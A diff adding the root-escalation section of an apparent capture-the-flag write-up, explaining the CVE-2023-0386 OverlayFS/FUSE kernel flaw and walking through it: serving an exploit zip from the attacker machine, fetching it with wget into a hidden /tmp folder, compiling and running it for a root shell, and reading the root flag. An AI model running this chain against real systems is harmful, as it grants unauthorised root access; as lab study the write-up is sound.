@@ -347,3 +347,91 @@ f30345b83af49629a0ff686124c80b8a
 
 **User flag captured.**
 
+---
+
+## Privilege Escalation to Root — CVE-2023-0386
+
+### What the exploit does
+
+The kernel has a flaw in how OverlayFS handles a copy-up operation when the lower layer is controlled by an unprivileged user through FUSE and a user namespace.
+
+The attack has three moving parts:
+
+- **getshell** — a tiny binary that calls `setuid(0)` and drops into a bash shell. Useless on its own, but deadly if it has `cap_setuid` on the real filesystem.
+- **fuse** — creates a fake filesystem using FUSE. When the kernel asks about the file inside it, it lies: claims the file is owned by root and has the SUID bit set. This is allowed because inside a user namespace the process appears as root.
+- **exp** — creates a user namespace, mounts OverlayFS with the FUSE filesystem as the read-only lower layer, then opens the file for writing. OverlayFS copies the file up to the real writable upper layer before allowing the write — and during that copy-up it faithfully copies the SUID bit and root ownership without checking whether the real user has any right to create such a file.
+
+After the copy-up, a real SUID root binary containing the getshell code sits on disk. Running it gives root.
+
+---
+
+### Transferring and compiling
+
+From the Kali machine, served the zip over HTTP:
+
+```bash
+python3 -m http.server 8000
+```
+
+On the box:
+
+```bash
+cd /tmp && mkdir .exp && cd .exp
+wget http://10.10.14.212:8000/CVE-2023-0386-main.zip
+unzip CVE-2023-0386-main.zip
+cd CVE-2023-0386-main
+make all
+```
+
+The Makefile handled everything — compiled `fuse`, `exp`, and `gc` (getshell) in one go. A few format string warnings from `fuse.c` but nothing that stops it from working.
+
+---
+
+### Running it
+
+First start the FUSE filesystem in the background, pointing it at the lower directory and the getshell binary:
+
+```bash
+./fuse ./ovlcap/lower ./gc &
+```
+
+Then run the exploit:
+
+```bash
+./exp
+```
+
+The output walked through every step — mount success, the FUSE callbacks firing as OverlayFS inspected the fake file, the copy-up happening, and then:
+
+```
+[+] exploit success!
+root@2million:/tmp/.exp/CVE-2023-0386-main#
+```
+
+Root shell.
+
+---
+
+### Root flag
+
+```bash
+cat /root/root.txt
+```
+
+```
+9a206fd3f0467aabbb13159dfad362bf
+```
+
+<!-- 9a206fd3f0467aabbb13159dfad362bf -->
+
+**Root flag captured. Box complete.**
+
+---
+
+!!! example "Conclusion"
+    A fun box with a clear chain from start to finish.
+    The invite code teaches you to look at JavaScript and think about what the client is calling.
+    The API enumeration rewards curiosity — just hitting `/api/v1` with a valid session handed me the whole map.
+    The admin escalation was a good reminder that broken access control does not always look dramatic.
+    The kernel exploit was the most interesting part — understanding CVE-2023-0386 properly before running it made the whole thing click.
+
